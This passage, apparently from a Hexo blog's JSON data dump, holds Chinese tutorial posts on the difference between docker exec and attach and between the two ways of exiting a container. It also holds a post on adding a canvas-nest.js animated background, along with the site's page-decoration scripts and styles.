使用attach进入容器时，会直接进入容器当前存在的bash(解释器)，而不会打开新的解释器，而在退出的时候，则会关闭唯一存在的解释器，也就是说容器没有存在的进程了，容器就认为自己没有存在的价值了，就会自己停止。\n\n### 退出容器的两种方法\n\n玩容器比较少的可能只知道退出容器的方法只有`exit`命令，但是在容器退出的时候其实还有<kbd>Ctrl</kbd>+<kbd>p</kbd>+<kbd>q<kbd>方式退出。\n\n### 退出容器的两种方法的区别\n\n退出容器的区别有一个前提是构建这个容器的时候，没有指定-d选项。否则设置后台运行是没有任何区别的。\n\n从下面的例子来看这两种退出容器的区别：\n\n```bash 折叠代码\nroot@knight:/docker# docker images\nREPOSITORY    TAG       IMAGE ID       CREATED             SIZE\nmynginx       0.1       babef9096509   About an hour ago   140MB\nnginx         latest    605c77e624dd   19 months ago       141MB\nhello-world   latest    feb5d9fea6a5   22 months ago       13.3kB\nroot@knight:/docker# docker run -it --name nginx-2 nginx:latest /bin/bash\nroot@634746a9bd08:/# exit\nexit\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE         COMMAND       CREATED          STATUS         PORTS     NAMES\nroot@knight:/docker# docker run -it --name nginx-3 nginx:latest /bin/bash\nroot@29ce1f7749cb:/# root@knight:/docker# docker ps\nCONTAINER ID   IMAGE          COMMAND                  CREATED          STATUS         PORTS     NAMES\n29ce1f7749cb   nginx:latest   \"/docker-entrypoint.…\"   9 seconds ago    Up 8 seconds   80/tcp    nginx-3\nroot@knight:/docker# \n```\n\n可以观察到：\n\n1. 在nginx-2这个容器中，使用exit退出之后，查看运行的容器，是查不到的，也就是说，退出意味着停止。\n\n2. 在nginx-3这个容器中，使用<kbd>Ctrl</kbd>+<kbd>p</kbd>+<kbd>q<kbd>停止，停止后查看运行的容器，发现nginx-3容器仍在运行，得出结论使用快捷键退出不会导致容器停止。","source":"_posts/ExitContainer.md","raw":"---\ntitle: 两种进入和退出容器的方法以及它们之间的区别\ndate: 2023-08-08 14:12:17\ncategories: 学习过程\ntags:\n  - Docker\n---\n\n### 进入容器的两种方法\n\n两种进入容器的方法分别是使用`exec`he`attach`两种方法。\n\n具体如下：\n\n* 使用`exec`的方式\n\n```bash\ndocker exec -it nginx-1 /bin/bash\n```\n\n* 使用`attach`的方式\n\n<!-- more -->\n\n```bash\ndocker attach nginx-1\n```\n\n### 进入容器两种方法的区别\n\n从下面的例子来看这两种进入容器的区别：\n\n```bash 折叠代码\nroot@knight:/docker# docker ps \nCONTAINER ID   IMAGE         COMMAND       CREATED          STATUS          PORTS     NAMES\nc2dbddec15d3   mynginx:0.1   \"/bin/bash\"   21 seconds ago   Up 20 seconds             nginx-1\nroot@knight:/docker# docker exec -it nginx-1 /bin/bash\nroot@c2dbddec15d3:/# exit\nexit\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE         COMMAND       CREATED         STATUS         PORTS     NAMES\nc2dbddec15d3   mynginx:0.1   \"/bin/bash\"   2 minutes ago   Up 2 minutes             nginx-1\nroot@knight:/docker# docker attach nginx-1\nroot@c2dbddec15d3:/# exit\nexit\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES\nroot@knight:/docker# \n```\n\n可以观察到以下几点区别：\n\n1. 进入容器的命令指定的参数不一样，exec更复杂一点，需要指定一些参数。\n\n2. 使用exec进去的容器，exit退出之后，容器仍然运行，但是使用attach进入的容器，exit退出之后，容器直接停止了。\n\n原因如下：\n\n1. exec在进入容器时，会在容器里额外打开一个bash，当退出时，会停用当前的这个bash，也就是说，容器中还会有之前的bash在运行，有bash就有进程，有进程就不会停止容器。这也就是为什么exec在进入容器时，要指定一个解释器的原因。\n\n2. 使用attach进入容器时，会直接进入容器当前存在的bash(解释器)，而不会打开新的解释器，而在退出的时候，则会关闭唯一存在的解释器，也就是说容器没有存在的进程了，容器就认为自己没有存在的价值了，就会自己停止。\n\n### 退出容器的两种方法\n\n玩容器比较少的可能只知道退出容器的方法只有`exit`命令，但是在容器退出的时候其实还有<kbd>Ctrl</kbd>+<kbd>p</kbd>+<kbd>q<kbd>方式退出。\n\n### 退出容器的两种方法的区别\n\n退出容器的区别有一个前提是构建这个容器的时候，没有指定-d选项。否则设置后台运行是没有任何区别的。\n\n从下面的例子来看这两种退出容器的区别：\n\n```bash 折叠代码\nroot@knight:/docker# docker images\nREPOSITORY    TAG       IMAGE ID       CREATED             SIZE\nmynginx       0.1       babef9096509   About an hour ago   140MB\nnginx         latest    605c77e624dd   19 months ago       141MB\nhello-world   latest    feb5d9fea6a5   22 months ago       13.3kB\nroot@knight:/docker# docker run -it --name nginx-2 nginx:latest /bin/bash\nroot@634746a9bd08:/# exit\nexit\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE         COMMAND       CREATED          STATUS         PORTS     NAMES\nroot@knight:/docker# docker run -it --name nginx-3 nginx:latest /bin/bash\nroot@29ce1f7749cb:/# root@knight:/docker# docker ps\nCONTAINER ID   IMAGE          COMMAND                  CREATED          STATUS         PORTS     NAMES\n29ce1f7749cb   nginx:latest   \"/docker-entrypoint.…\"   9 seconds ago    Up 8 seconds   80/tcp    nginx-3\nroot@knight:/docker# \n```\n\n可以观察到：\n\n1. 在nginx-2这个容器中，使用exit退出之后，查看运行的容器，是查不到的，也就是说，退出意味着停止。\n\n2. 在nginx-3这个容器中，使用<kbd>Ctrl</kbd>+<kbd>p</kbd>+<kbd>q<kbd>停止，停止后查看运行的容器，发现nginx-3容器仍在运行，得出结论使用快捷键退出不会导致容器停止。","slug":"ExitContainer","published":1,"updated":"2024-05-03T03:55:54.729Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5dx00237zj301g07hmv","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"进入容器的两种方法\"><a href=\"#进入容器的两种方法\" class=\"headerlink\" title=\"进入容器的两种方法\"></a>进入容器的两种方法</h3><p>两种进入容器的方法分别是使用<code>exec</code>he<code>attach</code>两种方法。</p>\n<p>具体如下：</p>\n<ul>\n<li>使用<code>exec</code>的方式</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker <span class=\"built_in\">exec</span> -it nginx-1 /bin/bash</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>使用<code>attach</code>的方式</li>\n</ul>\n<span id=\"more\"></span>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker attach nginx-1</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"进入容器两种方法的区别\"><a href=\"#进入容器两种方法的区别\" class=\"headerlink\" title=\"进入容器两种方法的区别\"></a>进入容器两种方法的区别</h3><p>从下面的例子来看这两种进入容器的区别：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker ps </span></span><br><span class=\"line\">CONTAINER ID   IMAGE         COMMAND       CREATED          STATUS          PORTS     NAMES</span><br><span class=\"line\">c2dbddec15d3   mynginx:0.1   <span class=\"string\">&quot;/bin/bash&quot;</span>   21 seconds ago   Up 20 seconds             nginx-1</span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker exec -it nginx-1 /bin/bash</span></span><br><span class=\"line\">root@c2dbddec15d3:/<span class=\"comment\"># exit</span></span><br><span class=\"line\"><span class=\"built_in\">exit</span></span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker ps</span></span><br><span class=\"line\">CONTAINER ID   IMAGE         COMMAND       CREATED         STATUS         PORTS     NAMES</span><br><span class=\"line\">c2dbddec15d3   mynginx:0.1   <span class=\"string\">&quot;/bin/bash&quot;</span>   2 minutes ago   Up 2 minutes             nginx-1</span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker attach nginx-1</span></span><br><span class=\"line\">root@c2dbddec15d3:/<span class=\"comment\"># exit</span></span><br><span class=\"line\"><span class=\"built_in\">exit</span></span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker ps</span></span><br><span class=\"line\">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># </span></span><br></pre></td></tr></table></figure>\n\n<p>可以观察到以下几点区别：</p>\n<ol>\n<li><p>进入容器的命令指定的参数不一样，exec更复杂一点，需要指定一些参数。</p>\n</li>\n<li><p>使用exec进去的容器，exit退出之后，容器仍然运行，但是使用attach进入的容器，exit退出之后，容器直接停止了。</p>\n</li>\n</ol>\n<p>原因如下：</p>\n<ol>\n<li><p>exec在进入容器时，会在容器里额外打开一个bash，当退出时，会停用当前的这个bash，也就是说，容器中还会有之前的bash在运行，有bash就有进程，有进程就不会停止容器。这也就是为什么exec在进入容器时，要指定一个解释器的原因。</p>\n</li>\n<li><p>使用attach进入容器时，会直接进入容器当前存在的bash(解释器)，而不会打开新的解释器，而在退出的时候，则会关闭唯一存在的解释器，也就是说容器没有存在的进程了，容器就认为自己没有存在的价值了，就会自己停止。</p>\n</li>\n</ol>\n<h3 id=\"退出容器的两种方法\"><a href=\"#退出容器的两种方法\" class=\"headerlink\" title=\"退出容器的两种方法\"></a>退出容器的两种方法</h3><p>玩容器比较少的可能只知道退出容器的方法只有<code>exit</code>命令，但是在容器退出的时候其实还有<kbd>Ctrl</kbd>+<kbd>p</kbd>+<kbd>q<kbd>方式退出。</kbd></kbd></p>\n<h3 id=\"退出容器的两种方法的区别\"><a href=\"#退出容器的两种方法的区别\" class=\"headerlink\" title=\"退出容器的两种方法的区别\"></a>退出容器的两种方法的区别</h3><p>退出容器的区别有一个前提是构建这个容器的时候，没有指定-d选项。否则设置后台运行是没有任何区别的。</p>\n<p>从下面的例子来看这两种退出容器的区别：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker images</span></span><br><span class=\"line\">REPOSITORY    TAG       IMAGE ID       CREATED             SIZE</span><br><span class=\"line\">mynginx       0.1       babef9096509   About an hour ago   140MB</span><br><span class=\"line\">nginx         latest    605c77e624dd   19 months ago       141MB</span><br><span class=\"line\">hello-world   latest    feb5d9fea6a5   22 months ago       13.3kB</span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker run -it --name nginx-2 nginx:latest /bin/bash</span></span><br><span class=\"line\">root@634746a9bd08:/<span class=\"comment\"># exit</span></span><br><span class=\"line\"><span class=\"built_in\">exit</span></span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker ps</span></span><br><span class=\"line\">CONTAINER ID   IMAGE         COMMAND       CREATED          STATUS         PORTS     NAMES</span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker run -it --name nginx-3 nginx:latest /bin/bash</span></span><br><span class=\"line\">root@29ce1f7749cb:/<span class=\"comment\"># root@knight:/docker# docker ps</span></span><br><span class=\"line\">CONTAINER ID   IMAGE          COMMAND                  CREATED          STATUS         PORTS     NAMES</span><br><span class=\"line\">29ce1f7749cb   nginx:latest   <span class=\"string\">&quot;/docker-entrypoint.…&quot;</span>   9 seconds ago    Up 8 seconds   80/tcp    nginx-3</span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># </span></span><br></pre></td></tr></table></figure>\n\n<p>可以观察到：</p>\n<ol>\n<li><p>在nginx-2这个容器中，使用exit退出之后，查看运行的容器，是查不到的，也就是说，退出意味着停止。</p>\n</li>\n<li><p>在nginx-3这个容器中，使用<kbd>Ctrl</kbd>+<kbd>p</kbd>+<kbd>q<kbd>停止，停止后查看运行的容器，发现nginx-3容器仍在运行，得出结论使用快捷键退出不会导致容器停止。</kbd></kbd></p>\n</li>\n</ol>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"进入容器的两种方法\"><a href=\"#进入容器的两种方法\" class=\"headerlink\" title=\"进入容器的两种方法\"></a>进入容器的两种方法</h3><p>两种进入容器的方法分别是使用<code>exec</code>he<code>attach</code>两种方法。</p>\n<p>具体如下：</p>\n<ul>\n<li>使用<code>exec</code>的方式</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker <span class=\"built_in\">exec</span> -it nginx-1 /bin/bash</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>使用<code>attach</code>的方式</li>\n</ul>","more":"<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker attach nginx-1</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"进入容器两种方法的区别\"><a href=\"#进入容器两种方法的区别\" class=\"headerlink\" title=\"进入容器两种方法的区别\"></a>进入容器两种方法的区别</h3><p>从下面的例子来看这两种进入容器的区别：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker ps </span></span><br><span class=\"line\">CONTAINER ID   IMAGE         COMMAND       CREATED          STATUS          PORTS     NAMES</span><br><span class=\"line\">c2dbddec15d3   mynginx:0.1   <span class=\"string\">&quot;/bin/bash&quot;</span>   21 seconds ago   Up 20 seconds             nginx-1</span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker exec -it nginx-1 /bin/bash</span></span><br><span class=\"line\">root@c2dbddec15d3:/<span class=\"comment\"># exit</span></span><br><span class=\"line\"><span class=\"built_in\">exit</span></span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker ps</span></span><br><span class=\"line\">CONTAINER ID   IMAGE         COMMAND       CREATED         STATUS         PORTS     NAMES</span><br><span class=\"line\">c2dbddec15d3   mynginx:0.1   <span class=\"string\">&quot;/bin/bash&quot;</span>   2 minutes ago   Up 2 minutes             nginx-1</span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker attach nginx-1</span></span><br><span class=\"line\">root@c2dbddec15d3:/<span class=\"comment\"># exit</span></span><br><span class=\"line\"><span class=\"built_in\">exit</span></span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker ps</span></span><br><span class=\"line\">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># </span></span><br></pre></td></tr></table></figure>\n\n<p>可以观察到以下几点区别：</p>\n<ol>\n<li><p>进入容器的命令指定的参数不一样，exec更复杂一点，需要指定一些参数。</p>\n</li>\n<li><p>使用exec进去的容器，exit退出之后，容器仍然运行，但是使用attach进入的容器，exit退出之后，容器直接停止了。</p>\n</li>\n</ol>\n<p>原因如下：</p>\n<ol>\n<li><p>exec在进入容器时，会在容器里额外打开一个bash，当退出时，会停用当前的这个bash，也就是说，容器中还会有之前的bash在运行，有bash就有进程，有进程就不会停止容器。这也就是为什么exec在进入容器时，要指定一个解释器的原因。</p>\n</li>\n<li><p>使用attach进入容器时，会直接进入容器当前存在的bash(解释器)，而不会打开新的解释器，而在退出的时候，则会关闭唯一存在的解释器，也就是说容器没有存在的进程了，容器就认为自己没有存在的价值了，就会自己停止。</p>\n</li>\n</ol>\n<h3 id=\"退出容器的两种方法\"><a href=\"#退出容器的两种方法\" class=\"headerlink\" title=\"退出容器的两种方法\"></a>退出容器的两种方法</h3><p>玩容器比较少的可能只知道退出容器的方法只有<code>exit</code>命令，但是在容器退出的时候其实还有<kbd>Ctrl</kbd>+<kbd>p</kbd>+<kbd>q<kbd>方式退出。</kbd></kbd></p>\n<h3 id=\"退出容器的两种方法的区别\"><a href=\"#退出容器的两种方法的区别\" class=\"headerlink\" title=\"退出容器的两种方法的区别\"></a>退出容器的两种方法的区别</h3><p>退出容器的区别有一个前提是构建这个容器的时候，没有指定-d选项。否则设置后台运行是没有任何区别的。</p>\n<p>从下面的例子来看这两种退出容器的区别：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker images</span></span><br><span class=\"line\">REPOSITORY    TAG       IMAGE ID       CREATED             SIZE</span><br><span class=\"line\">mynginx       0.1       babef9096509   About an hour ago   140MB</span><br><span class=\"line\">nginx         latest    605c77e624dd   19 months ago       141MB</span><br><span class=\"line\">hello-world   latest    feb5d9fea6a5   22 months ago       13.3kB</span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker run -it --name nginx-2 nginx:latest /bin/bash</span></span><br><span class=\"line\">root@634746a9bd08:/<span class=\"comment\"># exit</span></span><br><span class=\"line\"><span class=\"built_in\">exit</span></span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker ps</span></span><br><span class=\"line\">CONTAINER ID   IMAGE         COMMAND       CREATED          STATUS         PORTS     NAMES</span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker run -it --name nginx-3 nginx:latest /bin/bash</span></span><br><span class=\"line\">root@29ce1f7749cb:/<span class=\"comment\"># root@knight:/docker# docker ps</span></span><br><span class=\"line\">CONTAINER ID   IMAGE          COMMAND                  CREATED          STATUS         PORTS     NAMES</span><br><span class=\"line\">29ce1f7749cb   nginx:latest   <span class=\"string\">&quot;/docker-entrypoint.…&quot;</span>   9 seconds ago    Up 8 seconds   80/tcp    nginx-3</span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># </span></span><br></pre></td></tr></table></figure>\n\n<p>可以观察到：</p>\n<ol>\n<li><p>在nginx-2这个容器中，使用exit退出之后，查看运行的容器，是查不到的，也就是说，退出意味着停止。</p>\n</li>\n<li><p>在nginx-3这个容器中，使用<kbd>Ctrl</kbd>+<kbd>p</kbd>+<kbd>q<kbd>停止，停止后查看运行的容器，发现nginx-3容器仍在运行，得出结论使用快捷键退出不会导致容器停止。</kbd></kbd></p>\n</li>\n</ol>"},{"title":"设置博客背景动态特效","date":"2023-07-17T13:51:11.000Z","_content":"\n### 修改配置文件\n\n静态的博客实在是太单调了，增加一点动态的效果吧。\n\n1. 同添加背景图片一样，同样需要打开一个开关，也就是取消footer这个注释。\n\n<!-- more -->\n\n```yml 折叠代码\ncustom_file_path:\n  #head: source/_data/head.njk\n  #header: source/_data/header.njk\n  #sidebar: source/_data/sidebar.njk\n  #postMeta: source/_data/post-meta.njk\n  #postBodyEnd: source/_data/post-body-end.njk\n  footer: source/_data/footer.swig\n  #bodyEnd: source/_data/body-end.njk\n  #variable: source/_data/variables.styl\n  #mixin: source/_data/mixins.styl\n  style: source/_data/styles.styl\n  ```\n\n2. 取消注释以后，创建这样的一个文件source/_data/footer.swig，需要注意的是，这个source是站点目录下的source，而不是主题目录下的source。\n\n创建好之后，在文件插入以下代码：\n\n```js\n<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>\n```\n\n* color设置的是线条的RGB值。\n* opacity设置的是类似透明度的数值。\n* count设置的是线条的数量。\n\n重新生成一下配置，就会出现效果了。\n\n### 补充\n\n已经取消注释的文件对应的功能和教程链接。\n\n|文件|功能|\n|:---:|:---:|\n|footer|**[背景\"小飞棍\"](https://nustarain.gitee.io/2023/07/17/FlyLine/)**|\n|bodyEnd|**[折叠代码](https://nustarain.gitee.io/2023/09/09/blog-FoldCode/)**|\n|variable|**[设置圆角](https://nustarain.gitee.io/2023/09/09/blog-fillet/)**|\n|style|**[背景图片](https://nustarain.gitee.io/2023/07/17/BGPic/)**、**[博客透明度](https://nustarain.gitee.io/2023/09/09/blog-transparency/)**、**[折叠代码](https://nustarain.gitee.io/2023/09/09/blog-FoldCode/)**|","source":"_posts/FlyLine.md","raw":"---\ntitle: 设置博客背景动态特效\ndate: 2023-07-17 21:51:11\ncategories: 博客搭建\ntags:\n  - 博客美化\n---\n\n### 修改配置文件\n\n静态的博客实在是太单调了，增加一点动态的效果吧。\n\n1. 同添加背景图片一样，同样需要打开一个开关，也就是取消footer这个注释。\n\n<!-- more -->\n\n```yml 折叠代码\ncustom_file_path:\n  #head: source/_data/head.njk\n  #header: source/_data/header.njk\n  #sidebar: source/_data/sidebar.njk\n  #postMeta: source/_data/post-meta.njk\n  #postBodyEnd: source/_data/post-body-end.njk\n  footer: source/_data/footer.swig\n  #bodyEnd: source/_data/body-end.njk\n  #variable: source/_data/variables.styl\n  #mixin: source/_data/mixins.styl\n  style: source/_data/styles.styl\n  ```\n\n2. 取消注释以后，创建这样的一个文件source/_data/footer.swig，需要注意的是，这个source是站点目录下的source，而不是主题目录下的source。\n\n创建好之后，在文件插入以下代码：\n\n```js\n<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>\n```\n\n* color设置的是线条的RGB值。\n* opacity设置的是类似透明度的数值。\n* count设置的是线条的数量。\n\n重新生成一下配置，就会出现效果了。\n\n### 补充\n\n已经取消注释的文件对应的功能和教程链接。\n\n|文件|功能|\n|:---:|:---:|\n|footer|**[背景\"小飞棍\"](https://nustarain.gitee.io/2023/07/17/FlyLine/)**|\n|bodyEnd|**[折叠代码](https://nustarain.gitee.io/2023/09/09/blog-FoldCode/)**|\n|variable|**[设置圆角](https://nustarain.gitee.io/2023/09/09/blog-fillet/)**|\n|style|**[背景图片](https://nustarain.gitee.io/2023/07/17/BGPic/)**、**[博客透明度](https://nustarain.gitee.io/2023/09/09/blog-transparency/)**、**[折叠代码](https://nustarain.gitee.io/2023/09/09/blog-FoldCode/)**|","slug":"FlyLine","published":1,"updated":"2024-05-03T03:55:54.729Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5dz00277zj3f1zg74ny","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"修改配置文件\"><a href=\"#修改配置文件\" class=\"headerlink\" title=\"修改配置文件\"></a>修改配置文件</h3><p>静态的博客实在是太单调了，增加一点动态的效果吧。</p>\n<ol>\n<li>同添加背景图片一样，同样需要打开一个开关，也就是取消footer这个注释。</li>\n</ol>\n<span id=\"more\"></span>\n\n<figure class=\"highlight yml\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">custom_file_path:</span></span><br><span class=\"line\">  <span class=\"comment\">#head: source/_data/head.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#header: source/_data/header.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#sidebar: source/_data/sidebar.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#postMeta: source/_data/post-meta.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#postBodyEnd: source/_data/post-body-end.njk</span></span><br><span class=\"line\">  <span class=\"attr\">footer:</span> <span class=\"string\">source/_data/footer.swig</span></span><br><span class=\"line\">  <span class=\"comment\">#bodyEnd: source/_data/body-end.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#variable: source/_data/variables.styl</span></span><br><span class=\"line\">  <span class=\"comment\">#mixin: source/_data/mixins.styl</span></span><br><span class=\"line\">  <span class=\"attr\">style:</span> <span class=\"string\">source/_data/styles.styl</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>取消注释以后，创建这样的一个文件source&#x2F;_data&#x2F;footer.swig，需要注意的是，这个source是站点目录下的source，而不是主题目录下的source。</li>\n</ol>\n<p>创建好之后，在文件插入以下代码：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td 